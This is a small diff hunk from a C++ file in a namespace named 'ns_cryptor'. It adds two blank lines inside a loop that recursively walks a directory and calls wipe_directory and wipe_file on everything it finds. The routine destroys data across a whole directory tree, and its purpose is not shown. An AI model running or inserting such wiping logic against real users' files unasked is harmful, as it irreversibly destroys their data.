@@ -33,8 +33,10 @@ namespace ns_cryptor {
         fs::directory_iterator e;
         for(; i != e; ++i) {
             auto curr_path = i->path();
+
             if (fs::is_directory(curr_path)) {
                 wipe_directory(curr_path);
+
             } else if (fs::is_regular(curr_path)) {
                 wipe_file(curr_path);
             }
